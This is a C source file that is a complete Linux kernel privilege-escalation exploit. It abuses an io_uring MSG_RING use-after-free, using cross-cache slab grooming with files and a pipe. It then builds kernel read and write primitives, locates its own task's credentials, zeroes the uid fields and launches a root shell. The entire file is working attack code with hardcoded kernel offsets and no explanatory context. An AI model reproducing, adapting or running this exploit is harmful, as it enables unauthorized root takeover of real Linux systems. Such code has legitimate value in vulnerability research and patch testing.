#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <liburing.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <linux/kcmp.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <pthread.h>

const char *colorGreen = "\033[1;32m";
const char *colorRed = "\033[1;31m";
const char *colorReset = "\033[0m";
char debugchar[0x500];

void myDbgputs(char *message)
{
    printf("[%s+%s] %s\n", colorGreen, colorReset, message);
}

void myErrputs(char *message, int ifexit)
{
    printf("[%sx%s] %s\n", colorRed, colorReset, message);
    if (ifexit)
        exit(-1);
}

void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    myDbgputs("Bind to cpu 0");
}

void increase_fds(void)
{
    struct rlimit old_lim, lim;

    if (getrlimit(RLIMIT_NOFILE, &old_lim) != 0)
    {
        myErrputs("`getrlimit()` failed", 1);
    }

    lim.rlim_cur = old_lim.rlim_max;
    lim.rlim_max = old_lim.rlim_max;

    if (setrlimit(RLIMIT_NOFILE, &lim) != 0)
    {
        myErrputs("`setrlimit()` failed", 1);
    }
    sprintf(debugchar, "Increased fd limit from %d to %d", old_lim.rlim_cur, lim.rlim_cur);
    myDbgputs(debugchar);

    return;
}

struct fd_pair
{
    int fd[2];
};
struct fd_pair tpipe = {0};
#define PIPE_WRITE 1
#define PIPE_READ 0

void create_pipe()
{
    if (pipe(tpipe.fd) == -1)
    {
        myErrputs("`pipe() failed`", 1);
    }
    myDbgputs("Creat the pipe");
}

void release_pipe(void)
{
    close(tpipe.fd[PIPE_WRITE]);
    close(tpipe.fd[PIPE_READ]);
}

#define MYNAME "tr17ish"
void changename()
{
    if (prctl(PR_SET_NAME, MYNAME, NULL, NULL, NULL) != 0)
    {
        myErrputs("`prctl()` failed", 1);
    }
    myDbgputs("Reset the name to `tr17fish`");
}
// cat /sys/kernel/slab/filp/cpu_partial
#define CPU_PARTIAL 52
// cat /sys/kernel/slab/filp/objs_per_slab
#define OBJS_PER_SLAB 16
#define IORING_OP_MSG_RING 40
int cc1_fds[4096];
int cc_1_num;
int cc2_fds[4096];
int cc_2_num;
int cc3_fds[4096];
int cc_3_num;
int uaf_fd;

struct io_uring ring;
struct io_uring_sqe *sqe;
void do_uaf()
{
    io_uring_queue_init(64, &ring, 0);
    io_uring_register_files(&ring, &uaf_fd, 1);

    for (int i = 0; i < 2; i++)
    {
        sqe = io_uring_get_sqe(&ring);
        sqe->flags = IOSQE_FIXED_FILE;
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }
    io_uring_submit(&ring);
    sleep(1);
    myDbgputs("Finish UAF");
}

void cross_cache()
{
    // step1;
    sprintf(debugchar, "Cross-cache step1: open ((%d + 1) * %d) files", CPU_PARTIAL, OBJS_PER_SLAB);
    myDbgputs(debugchar);
    cc_1_num = (CPU_PARTIAL + 1) * OBJS_PER_SLAB;
    for (int i = 0; i < cc_1_num; i++)
    {
        cc1_fds[i] = open("/etc/passwd", O_RDONLY);
    }
    sleep(0.1);
    // step2
    sprintf(debugchar, "Cross-cache step2: (%d - 1) files", OBJS_PER_SLAB);
    myDbgputs(debugchar);
    cc_2_num = OBJS_PER_SLAB - 1;
    for (int i = 0; i < cc_2_num; i++)
    {
        cc2_fds[i] = open("/etc/passwd", O_RDONLY);
    }
    sleep(0.1);
    // step3
    myDbgputs("Cross-cache step3: open  uaf-files");
    uaf_fd = open("/etc/passwd", O_RDONLY);
    // //step5
    // myDbgputs("Cross-cache step5: free uaf-files");
    // do_uaf();
    // step4
    sprintf(debugchar, "Cross-cache step4: open (%d + 1) files", OBJS_PER_SLAB);
    myDbgputs(debugchar);
    cc_3_num = OBJS_PER_SLAB + 1;
    for (int i = 0; i < cc_3_num; i++)
    {
        cc3_fds[i] = open("/etc/passwd", O_RDONLY);
    }
    sleep(0.1);
    // step5
    myDbgputs("Cross-cache step5: free uaf-files");
    do_uaf();
    // step6
    myDbgputs("Cross-cache step6: close step2 and step3 files");
    for (int i = 0; i < cc_2_num; i++)
    {
        close(cc2_fds[i]);
    }

    for (int i = 0; i < cc_3_num; i++)
    {
        close(cc3_fds[i]);
    }
    sleep(0.1);
    // step7
    myDbgputs("Cross-cache step7: close the first file in step1 pages");
    for (int i = 0; i < cc_1_num; i++)
    {
        if (i % OBJS_PER_SLAB == 0)
        {
            close(cc1_fds[i]);
        }
    }
    sleep(1);
}

void cc_reset()
{
    myDbgputs("Resetting cross-cache state...");
    for (size_t i = 0; i < 0x1000; i++)
    {
        close(cc1_fds[i]);
        close(cc2_fds[i]);
        close(cc3_fds[i]);
    }
    cc_1_num = 0;
    cc_2_num = 0;
    cc_3_num = 0;
    close(uaf_fd);
    uaf_fd = -1;
    release_pipe();
    create_pipe();
    sleep(1);
}

void setup_env(void)
{
    // bind to cpu 0
    bind_cpu(0);
    // Increase FD limit
    increase_fds();
    // Reset the name
    changename();
    // Create pipe
    create_pipe();
}

#define I_WRITE_HINT_OFFSET 0X8f
uint64_t read_inode(uint64_t addr)
{
    char buf[0x1000];
    uint64_t target = addr - I_WRITE_HINT_OFFSET;
    uint64_t leak_addr = 0;
    for (int i = 0; i < 8; i++)
    {
        read(tpipe.fd[PIPE_READ], buf, 0x1000);
        memset(buf, 0, 0x1000);
        for (int j = 0; j < 16; j++)
        {
            *(uint64_t *)&buf[0x20 + j * 0x100] = target + i;
        }
        write(tpipe.fd[PIPE_WRITE], buf, 0x1000);
        uint64_t arg = 0;
        if (fcntl(uaf_fd, F_GET_RW_HINT, &arg) == -1)
        {
            myErrputs("`fcntl()` failed", 1);
        };
        leak_addr |= (arg << (i * 8));
    }
    return leak_addr;
}

#define ENTER_ERROR 0xfffffe0000002f48
#define BASE_OFFSET 0x1001490
#define INIT_OFFSET 0x1a1b580
#define TASK_NEXT_OFFSET 0x8b8
#define COMM_OFFSET 0xb98
#define CRED_OFFSET 0xb88
#define FILES_OFFSET 0Xbe0
#define FDT_OFFSET 0x20
#define FD_OFFSET 0x8
#define PRIVATE_DATA_OFFSET 0xc8
#define FD_OFFSET 0x8
uint64_t init_task_addr, my_task_addr, cred_addr;
uint64_t my_files_list, uaf_file_addr, pipe_addr;
uint64_t pipe_offset, fake_private_data_addr;

void find_myprocess()
{
    uint64_t next_cred = read_inode(init_task_addr + TASK_NEXT_OFFSET) - TASK_NEXT_OFFSET;
    uint64_t comm_now = read_inode(init_task_addr + COMM_OFFSET);
    uint64_t now_cred = init_task_addr;
    while (next_cred)
    {
        if (!strncmp(MYNAME, (char *)&comm_now, 7))
        {
            my_task_addr = now_cred;
            cred_addr = read_inode(my_task_addr + CRED_OFFSET);
            break;
        }
        else
        {
            now_cred = next_cred;
            next_cred = read_inode(now_cred + TASK_NEXT_OFFSET) - TASK_NEXT_OFFSET;
            comm_now = read_inode(now_cred + COMM_OFFSET);
        }
    }
}

void find_pipe_addr()
{
    uint64_t first_file_addr = read_inode(my_files_list);
    uaf_file_addr = read_inode(first_file_addr + uaf_fd * 8);
    pipe_offset = uaf_file_addr & 0xfff;
    pipe_addr = (uaf_file_addr >> 12) << 12;
    if(pipe_offset < 0x700)
    {
        fake_private_data_addr = pipe_addr + 0x800;
    }else{
        fake_private_data_addr = pipe_addr;
    }
}

unsigned char ring_copy_mem[256] = { 0 };
unsigned char private_copy_mem[0x4c0] = { 0 };
void copy_from_ring()
{
    uint64_t files_ptr = read_inode(my_files_list);
    
    // Adjust the files_ptr to point to our ring fd in the array
    files_ptr += (8 * ring.ring_fd);
    // Get the address of our UAF file struct
    uint64_t curr_file = read_inode(files_ptr);
    uint64_t curr_private = read_inode(curr_file + PRIVATE_DATA_OFFSET);

    // Copy all the data into the buffer
    for (size_t i = 0; i < 32; i++)
    {
        uint64_t *val_ptr = (uint64_t *)&ring_copy_mem[i * 8];
        *val_ptr = read_inode(curr_file + (i * 8));
    }
    for (size_t i = 0; i < 152; i++)
    {
        uint64_t *val_ptr = (uint64_t *)&private_copy_mem[i * 8];
        *val_ptr = read_inode(curr_private + (i * 8));
    }
    sprintf(debugchar, "copy 0x100 byte data from 0x%lx", curr_file);
    myDbgputs(debugchar);
}

void set_fake_private_data(uint64_t addr, uint64_t value)
{
    char buf[0x1000];
    read(tpipe.fd[PIPE_READ], buf, 0x1000);
    memcpy(&buf[pipe_offset], ring_copy_mem, 0x100);
    
    uint64_t *private_data = (uint64_t *)&buf[pipe_offset + PRIVATE_DATA_OFFSET];
    *private_data = fake_private_data_addr;
    memcpy(&buf[fake_private_data_addr & 0xfff], private_copy_mem, 0x4c0);

    // // Set ctx->rings so that ctx->rings->cq.tail is written to. That is at 
    // // offset 0xc0 from cq base address
    size_t rings = (fake_private_data_addr + 0x10) & 0xfff;
    uint64_t *rings_ptr = (uint64_t *)&buf[rings];
    *rings_ptr = addr - 0xc0;

    // Set ctx->cached_cq_tail which is our what
    size_t cq_tail = (fake_private_data_addr + 0x250) & 0xfff;
    uint32_t *cq_tail_ptr = (uint32_t *)&buf[cq_tail];
    *cq_tail_ptr = (value - 1);

    // Set ctx->cq_wait the list head to itself (so that it's "empty")
    size_t real_cq_wait = fake_private_data_addr + 0x268;
    size_t cq_wait = (real_cq_wait & 0xFFF);
    uint64_t *cq_wait_ptr = (uint64_t *)&buf[cq_wait];
    *cq_wait_ptr = real_cq_wait;

    write(tpipe.fd[PIPE_WRITE], buf, 0x1000);
    struct io_uring_sqe *sqe = NULL;
    sqe = io_uring_get_sqe(&ring);
    sqe->opcode = IORING_OP_MSG_RING;
    sqe->fd = uaf_fd;
    io_uring_submit(&ring);
}

int main()
{
    myDbgputs("Begin!");
    setup_env();
    unsigned char buf[0x1000];
    memset(buf, 'A', 0x1000);
    while (true)
    {
        myDbgputs("Attempting cross-cache...");
        cross_cache();
        write(tpipe.fd[PIPE_WRITE], buf, 0x1000);
        if (lseek(uaf_fd, 0, SEEK_SET) != -1)
        {
            myErrputs("Cross-cache failed, retrying...", 0);
            cc_reset();
        }
        else
        {
            myDbgputs("Cross-cache succeeded");
            break;
        }
    }
    uint64_t enter_error_addr = read_inode(ENTER_ERROR) - 146;
    sprintf(debugchar, "enter_error_addr @ 0x%llx", enter_error_addr);
    myDbgputs(debugchar);
    uint64_t kernel_base_addr = enter_error_addr - BASE_OFFSET;
    sprintf(debugchar, "kernel_base_addr @ 0x%llx", kernel_base_addr);
    myDbgputs(debugchar);
    init_task_addr = kernel_base_addr + INIT_OFFSET;
    sprintf(debugchar, "init_task_addr @ 0x%llx", init_task_addr);
    myDbgputs(debugchar);
    find_myprocess();
    sprintf(debugchar, "'%s' task @ 0x%lx", MYNAME, my_task_addr);
    myDbgputs(debugchar);
    sprintf(debugchar, "cred_addr @ 0x%llx", cred_addr);
    getchar();
    myDbgputs(debugchar);
    my_files_list = read_inode(
        read_inode(my_task_addr + FILES_OFFSET) + FDT_OFFSET) + FD_OFFSET;
    sprintf(debugchar, "my_files_list @ 0x%lx", my_task_addr);
    myDbgputs(debugchar);
    find_pipe_addr();
    sprintf(debugchar, "uaf_file_addr @ 0x%lx", uaf_file_addr);
    myDbgputs(debugchar);
    sprintf(debugchar, "pipe_addr @ 0x%lx", pipe_addr);
    myDbgputs(debugchar);
    copy_from_ring();
    for(int i = 1; i < 11; i++)
    {
        set_fake_private_data((cred_addr + 4 * i), 0);
    }
    if(getuid() == 0)
    {
        sprintf(debugchar, "Uid: %d, hacked by T1d!", getuid());
        myDbgputs(debugchar);
        system("/bin/sh");
        char *argv[] = {"/bin/sh", "-c", "/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }else{
        sprintf(debugchar, "Uid : %d , you are not root!\n", getuid());
        myErrputs(debugchar, 1);
    }
}